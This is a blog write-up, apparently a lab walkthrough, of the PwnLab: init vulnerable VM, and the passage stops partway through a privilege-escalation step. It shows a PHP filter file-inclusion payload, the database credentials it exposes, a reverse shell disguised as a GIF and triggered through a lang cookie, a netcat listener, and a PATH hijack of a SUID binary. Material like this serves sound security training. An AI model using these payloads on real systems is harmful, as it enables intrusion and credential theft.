@@ -1,0 +1,888 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Pwnlab: init - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Pwnlab init writeup">
+  <meta name="keywords" content="pwnlab init, pentest lab, hacking lab, pwnlab, vulnhub">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2018/08/25/pwnlab-init">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Pwnlab: init</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-08-25T17:01:13-04:00" pubdate data-updated="true">Aug 25<span>th</span>, 2018</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.164.129
+</span><span class='line'>Host is up (0.00099s latency).
+</span><span class='line'>Not shown: 65531 closed ports
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
+</span><span class='line'>|_http-title: PwnLab Intranet Image Hosting
+</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
+</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
+</span><span class='line'>|   100024  1          37397/udp  status
+</span><span class='line'>|_  100024  1          58026/tcp  status
+</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
+</span><span class='line'>| mysql-info: 
+</span><span class='line'>|   Protocol: 10
+</span><span class='line'>|   Version: 5.5.47-0+deb8u1
+</span><span class='line'>|   Thread ID: 38
+</span><span class='line'>|   Capabilities flags: 63487
+</span><span class='line'>|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+</span><span class='line'>|   Status: Autocommit
+</span><span class='line'>|   Salt: pKc2lJniDVf|]&lt;Rg2bwQ
+</span><span class='line'>|_  Auth Plugin Name: 88
+</span><span class='line'>58026/tcp open  status  1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The website is an intranet portal for uploading images, but we have to login first.</p>
+
+<p><img class="center" src="/images/pentest/pwnlab_init/web.jpg" title="web server" alt="intranet portal"></p>
+
+<p>I ran Nikto on it but there were no interesting finds, except for the following line:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+ /config.php: PHP Config file may contain database IDs and passwords.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, when I tried to read that file, all I got was a blank page. I&rsquo;ve noticed that the URLs for the pages look like this: <a href="http://192.168.164.129/?page=login">http://192.168.164.129/?page=login</a> for the login page and <a href="http://192.168.164.129/?page=upload">http://192.168.164.129/?page=upload</a> for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI method that uses PHP filters</a>. The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it:</p>
+
+<p><code>url?page=php://filter/convert.base64-encode/resource=config</code></p>
+
+<p>This returned a base64 string that when decoded, gave me the MySQL credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
+</span><span class='line'>$server     = "localhost";
+</span><span class='line'>$username = "root";
+</span><span class='line'>$password = "H4u%QJ_H99";
+</span><span class='line'>$database = "Users";
+</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can connect to that database:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -h 192.168.217.143
+</span><span class='line'>ERROR 1045 (28000): Access denied for user 'root'@'192.168.217.132' (using password: NO)
+</span><span class='line'>root@kali:~# mysql -u root -p -h 192.168.217.143
+</span><span class='line'>Enter password: 
+</span><span class='line'>Welcome to the MariaDB monitor.  Commands end with ; or \g.
+</span><span class='line'>Your MySQL connection id is 41
+</span><span class='line'>Server version: 5.5.47-0+deb8u1 (Debian)
+</span><span class='line'>
+</span><span class='line'>Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+</span><span class='line'>
+</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+</span><span class='line'>
+</span><span class='line'>MySQL [(none)]&gt; use Users
+</span><span class='line'>Reading table information for completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A
+</span><span class='line'>
+</span><span class='line'>Database changed
+</span><span class='line'>MySQL [Users]&gt;  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what we have here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [Users]&gt; show tables;
+</span><span class='line'>+-----------------+
+</span><span class='line'>| Tables_in_Users |
+</span><span class='line'>+-----------------+
+</span><span class='line'>| users           |
+</span><span class='line'>+-----------------+
+</span><span class='line'>1 row in set (0.00 sec)
+</span><span class='line'>MySQL [Users]&gt; select * from users;
+</span><span class='line'>+------+------------------+
+</span><span class='line'>| user | pass             |
+</span><span class='line'>+------+------------------+
+</span><span class='line'>| kent | Sld6WHVCSkpOeQ== |
+</span><span class='line'>| mike | U0lmZHNURW42SQ== |
+</span><span class='line'>| kane | aVN2NVltMkdSbw== |
+</span><span class='line'>+------+------------------+
+</span><span class='line'>3 rows in set (0.05 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>3 users with base64 encoded passwords!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kent / JWzXuBJJNy
+</span><span class='line'>mike / SIfdsTEn6I
+</span><span class='line'>kane / iSv5Ym2GRo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let&rsquo;s take a look at the source code of the upload page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="p">);</span> <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">  &lt;body&gt;</span>
+</span><span class='line'><span class="x">      &lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&gt;</span>
+</span><span class='line'><span class="x">          &lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&gt;</span>
+</span><span class='line'><span class="x">          &lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&gt;</span>
+</span><span class='line'><span class="x">      &lt;/form&gt;</span>
+</span><span class='line'><span class="x">  &lt;/body&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> <span class="nb">strrchr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
+</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;.jpg&quot;</span><span class="p">,</span><span class="s2">&quot;.jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;.gif&quot;</span><span class="p">,</span><span class="s2">&quot;.png&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">)))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span><span class="s1">&#39;image&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 001&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 002&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">substr_count</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 003&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 4&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey&rsquo;s reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code></p>
+
+<p>My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I&rsquo;ve looked t the source code of the index page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
+</span><span class='line'><span class="c1">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]))</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="c1">// Not implemented yet.</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">&lt;head&gt;</span>
+</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
+</span><span class='line'><span class="x">&lt;/head&gt;</span>
+</span><span class='line'><span class="x">&lt;body&gt;</span>
+</span><span class='line'><span class="x">&lt;center&gt;</span>
+</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
+</span><span class='line'><span class="x">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
+</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;/center&gt;</span>
+</span><span class='line'><span class="x">&lt;/body&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt; </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: lang=../../../../etc/passwd</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And in our listener, we have a hit!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
+</span><span class='line'>listening on [any] 8888 ...
+</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
+</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
+</span><span class='line'> 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
+</span><span class='line'>$ python -c "import pty;pty.spawn('/bin/sh');"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I&rsquo;ve proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane&rsquo;s home folder there&rsquo;s an interesting SUID binary called <em>msgmike</em></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trying to run it gives an error:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ ./msgmike
+</span><span class='line'>./msgmike
+</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane&rsquo;s home to the PATH variable, we should be able to run an arbitrary program with mike&rsquo;s privileges.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ echo "/bin/bash" &gt; cat
+</span><span class='line'>echo "/bin/bash" &gt; cat
+</span><span class='line'>kane@pwnlab:~$ chmod 777 cat
+</span><span class='line'>chmod 777 cat</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we want to run bash as mike. Let&rsquo;s see how the PATH looks:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ echo $PATH
+</span><span class='line'>echo $PATH
+</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now let&rsquo;s add the current location to the PATH:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=.:$PATH
+</span><span class='line'>kane@pwnlab:~$ echo $PATH
+</span><span class='line'>echo $PATH
